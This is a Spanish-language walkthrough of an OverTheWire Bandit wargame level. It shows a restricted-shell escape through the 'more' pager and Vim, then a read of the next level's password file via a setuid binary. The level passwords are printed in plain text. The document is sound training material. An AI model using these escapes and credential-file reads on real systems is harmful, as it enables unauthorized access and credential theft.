## Objetivo

Good job getting a shell! Now hurry and grab the password for bandit27!
## Datos de Acceso al Nivel

```
username: bandit26
psw: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```

## Solución
```bash
C:\Users\pac61>ssh -i llave26.txt bandit26@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit26@bandit.labs.overthewire.org's password:
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
------------------------
--More--(66%)

:set shell = /bin/bash
:shell
bandit26@bandit:~$ ls
bandit27-do  text.txt
bandit26@bandit:~$ ls -la
total 44
drwxr-xr-x  3 root     root      4096 Jul 17 15:57 .
drwxr-xr-x 70 root     root      4096 Jul 17 15:58 ..
-rwsr-x---  1 bandit27 bandit26 14880 Jul 17 15:57 bandit27-do
-rw-r--r--  1 root     root       220 Mar 31 08:41 .bash_logout
-rw-r--r--  1 root     root      3771 Mar 31 08:41 .bashrc
-rw-r--r--  1 root     root       807 Mar 31 08:41 .profile
drwxr-xr-x  2 root     root      4096 Jul 17 15:57 .ssh
-rw-r-----  1 bandit26 bandit26   258 Jul 17 15:57 text.txt
bandit26@bandit:~$ ./
bandit27-do   .bash_logout  .bashrc       .profile      .ssh/         text.txt
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
bandit26@bandit:~$   
```

# Información obtenida
```
pwd level 27: upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```
## Notas Adicionales
- una vez que estamos en more tecleamos la tecla v para ir al editor de Vim, una vez que estamos en Vim, tecleamos ESC + :  y escribes: set shell = /bin/bash
- Luego ESC + : y escribes: shell
- cuando te conectas de manera inicial con la llave, tienes que hacer la ventana más pequeña para que more no alcance a mostrar todo el contenido del archivo y luego podemos escapar de ahí.
# Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)
## Referencias
- [¿Qué es cron?](https://opensource.com/article/21/7/cron-linux#:~:text=SA%20Seth%20Kenlon-,The%20cron%20system%20is%20a%20method%20to%20automatically%20run%20commands,user%20to%20automate%20their%20computer.)